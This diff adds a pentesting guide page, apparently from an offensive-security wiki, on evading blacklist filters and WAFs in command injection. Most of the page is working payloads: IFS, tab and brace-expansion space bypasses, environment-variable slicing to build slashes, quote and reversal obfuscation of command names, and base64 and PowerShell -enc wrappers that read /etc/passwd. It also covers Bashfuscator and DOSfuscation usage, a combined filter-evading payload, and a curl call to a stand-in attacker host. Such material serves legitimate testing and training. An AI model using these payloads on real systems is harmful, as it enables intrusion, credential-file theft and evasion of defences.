@@ -1,0 +1,377 @@
+---
+title: Filter bypass
+description: Defeating blacklist filters and WAFs in command injection - space bypass, character substitution, command obfuscation, and automated evasion tools.
+mitre: [T1190, T1059, T1027]
+d3fend: [D3-MH, D3-MA]
+impact: [RCE]
+owasp: [A05]
+sidebar:
+  order: 6
+  label: Filter bypass
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+## TL;DR
+
+When a basic separator gets you "invalid input," something specific is blacklisted - operators, spaces, slashes, or command names. Reduce the payload character-by-character to find the trigger, then swap it for an equivalent.
+
+```bash
+# Space bypass
+{ls,-la}                        # brace expansion
+ls${IFS}-la                     # IFS variable
+ls%09-la                        # tab (URL-encoded)
+
+# Slash bypass
+${PATH:0:1}                     # = "/"
+${HOME:0:1}                     # = "/" (usually)
+
+# Command obfuscation
+w'h'o'am'i                      # quote insertion
+who$@ami                        # positional param
+$(rev<<<imaohw)                 # reversed
+bash<<<$(base64 -d<<<<base64>)  # base64 wrapper
+```
+
+This page is single-page (not OS-tabbed) because filter bypass tricks are deeply OS-specific - Linux env var slicing and Windows `%VAR:~start,end%` syntax don't cross-translate, and tab-syncing would force you to re-find the same trick under both tabs.
+
+## Identifying what's filtered
+
+<Steps>
+
+1. **Confirm a working baseline.** Send the legitimate input. Page returns success.
+
+2. **Add one character at a time.** Append your separator, then build up: `127.0.0.1`, `127.0.0.1;`, `127.0.0.1;i`, `127.0.0.1;id`. The first request that fails identifies the filtered character or substring.
+
+3. **Check separator variants.** If `;` fails, try `\n` (`%0a`), `&` (`%26`), `|` (`%7c`), `&&`, `||`, `` ` ``, `$()`. Newline is rarely blacklisted.
+
+4. **Check the command name.** If `;id` fails but `;<random>` returns a different error, the *command* is blacklisted, not the separator. Move to command obfuscation.
+
+5. **Check spaces.** Send `;id` (works) then `;id ` (fails) - space is filtered. Move to space bypass.
+
+</Steps>
+
+<Aside type="tip">
+The "reduce by one character" methodology beats guessing. It tells you *exactly* what's filtered in one or two minutes, instead of cycling through bypass techniques blindly.
+</Aside>
+
+## Space bypass
+
+Spaces are the most commonly blocked character because legitimate inputs (IPs, hostnames, filenames) shouldn't contain them.
+
+### Linux
+
+**Tab character (`%09`)**
+
+The simplest substitute. Bash treats tab and space identically as argument separators.
+
+```
+;id%09-a                        # `id -a`
+;cat%09/etc/passwd
+```
+
+**`${IFS}` - Internal Field Separator**
+
+Bash variable that expands to whitespace (space, tab, newline by default).
+
+```bash
+;ls${IFS}-la
+;cat${IFS}/etc/passwd
+;cat${IFS}$1/etc/passwd         # `$1` is empty in default shell context - useful padding
+```
+
+**Brace expansion**
+
+Bash expands `{a,b,c}` into `a b c` with spaces inserted automatically.
+
+```bash
+;{ls,-la}
+;{cat,/etc/passwd}
+;{curl,<ATTACKER>/x}
+```
+
+The brace form is also useful when *both* spaces and the command name are filtered, because the tokens inside braces aren't visible as the original command.
+
+**Newline**
+
+Bash splits commands on newlines too:
+
+```
+%0aid                           # newline as separator AND argument boundary
+```
+
+Less useful for "space inside a single command" - newline ends the command.
+
+### Windows
+
+**cmd.exe - comma and semicolon are argument separators**
+
+```cmd
+&dir,C:\Users
+&type;C:\Windows\win.ini
+```
+
+**PowerShell - backtick newline**
+
+```powershell
+;dir`nC:\Users                  # backtick + n forces newline
+```
+
+PowerShell is much less likely to need space bypass - most cmdlets accept positional arguments without spaces being syntactically required.
+
+## Slash bypass
+
+Backslash and forward slash are blocked because they're needed for paths.
+
+### Linux
+
+**Environment variable slicing**
+
+`${VAR:start:length}` extracts substrings. Pick a variable whose value contains the character you need at a known position.
+
+```bash
+${PATH:0:1}                     # /usr/bin... → "/"
+${HOME:0:1}                     # /root or /home/x → "/"
+${PWD:0:1}                      # current dir → "/"
+```
+
+Combined:
+
+```bash
+;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+# = cat /etc/passwd
+```
+
+**Other useful single-character extractions**
+
+```bash
+${LS_COLORS:10:1}               # = ";"
+${PATH:5:1}                     # often "l" depending on PATH
+echo ${IFS:0:1} | xxd           # confirm what IFS expands to (usually space)
+```
+
+To produce an arbitrary character: dump `printenv` on a similar system and find a variable containing the character at a known index.
+
+### Windows
+
+**cmd.exe - `%VAR:~start,length%`**
+
+```cmd
+%HOMEPATH:~6,-11%               # \Users\<user> → trim to "\"
+%CD:~0,1%                       # current dir's first char → "C"
+```
+
+Negative length means "trim that many from the end."
+
+**PowerShell - array indexing on string**
+
+```powershell
+$env:HOMEPATH[0]                # "\"
+$env:PROGRAMFILES[0]            # "C"
+```
+
+PowerShell treats strings as char arrays for indexing. No length needed for single chars.
+
+## Command name obfuscation
+
+Filter blocks the literal command (`whoami`, `cat`, `wget`). Insert characters the shell discards.
+
+### Linux
+
+**Quote insertion** (works in bash, sh, dash):
+
+```bash
+w'h'o'am'i                      # single quotes - even count required
+w"h"o"am"i                      # double quotes - even count required
+w''h''o''am''i                  # multiple quote groups OK
+```
+
+Don't mix `'` and `"` in the same word. Quote count must be even.
+
+**Backslash insertion** (bash, sh):
+
+```bash
+w\h\o\am\i
+```
+
+No even-count requirement. Works because `\<char>` in unquoted context is just `<char>` to the shell.
+
+**Positional parameter `$@`** (bash):
+
+```bash
+who$@ami
+```
+
+`$@` expands to nothing in default shell context.
+
+**Variable concatenation**:
+
+```bash
+a=who;b=ami;$a$b                # "whoami"
+a=wh;b=oa;c=mi;$a$b$c
+```
+
+Useful when filter scans for the literal substring but doesn't simulate variable expansion.
+
+**Case manipulation** (Linux is case-sensitive - these *invoke* a case-converting wrapper):
+
+```bash
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+```
+
+Sends mixed case through the request, lowercases at runtime. Useful when the filter is a case-sensitive blacklist and you want to send the command in a case it won't match.
+
+**Reversal**:
+
+```bash
+$(rev<<<'imaohw')               # reverses to "whoami", executes
+```
+
+Filter sees `imaohw`, not `whoami`.
+
+### Windows
+
+**Caret escape** (cmd.exe):
+
+```cmd
+who^ami                         # ^ is discarded, runs whoami
+```
+
+The caret is cmd's escape character; `^<char>` becomes `<char>`. Doesn't need to be even.
+
+**Quote insertion** (both shells):
+
+```cmd
+w"h"o"am"i
+```
+
+**PowerShell case-insensitive**:
+
+PowerShell ignores case for cmdlets and built-ins natively:
+
+```powershell
+WhOaMi                          # works as-is
+```
+
+If the filter is case-sensitive, just change case.
+
+**PowerShell reversal**:
+
+```powershell
+iex "$('imaohw'[-1..-20] -join '')"
+```
+
+## Wholesale payload encoding
+
+When multiple things are filtered (spaces *and* slashes *and* command names), encode the entire command and decode at runtime.
+
+### Linux - base64
+
+```bash
+# Encode locally
+echo -n 'cat /etc/passwd' | base64 -w0
+# Output: Y2F0IC9ldGMvcGFzc3dk
+
+# Inject
+;bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
+```
+
+The `<<<` herestring avoids `|` (pipe). The full payload:
+
+```
+;bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
+```
+
+(`%09` for the space inside `base64 -d`.)
+
+If `base64` is filtered, `openssl base64 -d` and `xxd -r -p` (for hex) are equivalents:
+
+```bash
+;bash<<<$(xxd -r -p<<<63617420 2f6574632f706173737764)
+```
+
+### Windows - PowerShell `-EncodedCommand`
+
+```bash
+# Encode locally (UTF-16LE base64)
+echo -n 'Get-Content C:\Users\admin\flag.txt' | iconv -t UTF-16LE | base64 -w0
+# Output: RwBlAHQALQBDAG8AbgB0AGUAbgB0AC...
+```
+
+```powershell
+;powershell -nop -w hidden -enc RwBlAHQALQBDAG8AbgB0AGUAbgB0AC...
+```
+
+`-EncodedCommand` (alias `-enc`, `-e`, `-ec`) accepts UTF-16LE base64. The encoding step is what trips most people up; UTF-8 base64 will not work.
+
+## Automated obfuscation
+
+When manual techniques aren't enough - heavy WAF, ML-based detection, layered filters - drop into a generator.
+
+### Bashfuscator (Linux)
+
+[Bashfuscator/Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) - generates obfuscated bash that executes a target command.
+
+```bash
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator && python3 setup.py install --user
+./bashfuscator/bin/bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+```
+
+Flags: `-s 1 -t 1 --no-mangling --layers 1` keep output short. Without these, Bashfuscator can produce 100KB+ payloads - useless for URL injection.
+
+Test the output locally before sending:
+
+```bash
+bash -c '<bashfuscator-output>'
+```
+
+### DOSfuscation (Windows)
+
+[danielbohannon/Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) - interactive, generates obfuscated cmd.exe payloads.
+
+```powershell
+git clone https://github.com/danielbohannon/Invoke-DOSfuscation
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation
+# Inside the prompt:
+SET COMMAND type C:\Users\admin\flag.txt
+encoding
+1
+```
+
+Available on Linux via `pwsh` (PowerShell Core).
+
+## Combining techniques
+
+Real engagements stack filters. Combine bypass techniques into a single payload.
+
+```bash
+# Filtered: spaces, slashes, "cat", "whoami"
+# Newline allowed, environment variables allowed
+
+%0a${LS_COLORS:10:1}c'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+Breakdown:
+- `%0a` - newline separator (avoids `;`)
+- `${LS_COLORS:10:1}` - produces `;` for chained commands
+- `c'a't` - `cat` with quote insertion
+- `${IFS}` - space
+- `${PATH:0:1}etc${PATH:0:1}passwd` - `/etc/passwd`
+
+## Common failure modes
+
+- **Variable doesn't expand inside the URL.** Some frameworks URL-decode but don't shell-expand `${VAR}` until the shell sees it. If your `${PATH:0:1}` arrives at the shell as the literal string `${PATH:0:1}`, you're fine. If it arrives as `` (because something pre-expanded it in an empty context), the shell is wrong - use `$PATH` without slicing and grep for what you need.
+- **Quote insertion breaks inside subshells.** `$(rev<<<'imaohw')` works at the top level; `$(echo $(rev<<<'imaohw'))` may not, because nested quoting gets confused. Keep nesting shallow.
+- **Bash-only constructs in `dash`.** `<<<` herestrings, `${var:offset:length}`, `${var,,}`, `$@` shell tricks - all bash-isms. Default `/bin/sh` on Debian/Ubuntu is dash, which lacks them. Wrap with `bash -c '...'` or use POSIX equivalents (`echo X | rev` instead of `rev<<<X`).
+- **WAF normalizes URL encoding before matching.** Filter rule matches `cat` after URL decoding. URL-encoding the letters (`%63%61%74`) doesn't help - WAF decodes first. You need *semantic* obfuscation (quote insertion, variable concat), not encoding.
+- **Filter validates after expansion.** Some filters run the constructed command string through a deny-list check after substituting variables. If `${PATH:0:1}etc${PATH:0:1}passwd` resolves to `/etc/passwd` and the filter then catches `passwd`, no amount of variable slicing helps. Check by submitting payloads where the *result* contains a benign string and see which fails.
+- **Commands need `bash`, only `sh` available.** `;bash -c '...'` fails with "bash not found" on minimal containers. Use `sh`, `/bin/sh`, or a different language entirely (`python3 -c '...'`, `perl -e '...'`).
+
+## Notes
+
+The order of operations matters: detect the filter, identify *what* is blocked, then apply the minimum bypass. Stacking every technique into one payload - base64-wrapping a brace-expanded quote-inserted reversed command - works occasionally and fails most of the time because every layer adds a way to break. Start with the simplest bypass (`%0a`, `${IFS}`, `w'h'o'am'i`) and only escalate when something specific demands it.
+
+For a deeper catalog of bypass tricks, [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) has the broadest enumeration. The techniques on this page are the ones that actually land in 80%+ of cmdi engagements.
